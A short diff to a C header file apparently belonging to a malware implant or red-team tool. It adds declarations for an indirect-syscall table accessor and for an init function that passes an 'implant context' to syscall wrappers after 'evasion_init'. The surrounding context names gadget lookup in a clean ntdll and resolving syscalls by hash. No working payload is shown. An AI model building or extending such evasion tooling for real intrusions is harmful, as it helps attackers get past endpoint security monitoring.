@@ -91,6 +91,12 @@ PVOID sc_find_gadget(PVOID clean_ntdll);
  */
 SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *table, DWORD func_hash);
 
+/**
+ * Return a pointer to the file-scope static syscall table in syscalls.c.
+ * Avoids extern cross-TU references that generate .refptr entries.
+ */
+SYSCALL_TABLE *sc_get_table(void);
+
 /* ------------------------------------------------------------------ */
 /*  Indirect syscall stub (defined in asm/syscall_stub.S)               */
 /* ------------------------------------------------------------------ */
@@ -103,6 +109,13 @@ SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *table, DWORD func_hash);
  * Up to 12 arguments supported beyond SSN and syscall_addr.
  */
 extern NTSTATUS spec_syscall(DWORD ssn, PVOID syscall_addr, ...);
+
+/**
+ * Initialize the syscall wrappers with the implant context pointer.
+ * Must be called once from entry.c after evasion_init so that
+ * wrappers can reach the EVASION_CONTEXT without extern globals.
+ */
+void syscall_wrappers_init(IMPLANT_CONTEXT *ctx);
 
 /* ------------------------------------------------------------------ */
 /*  Convenience wrappers                                                */
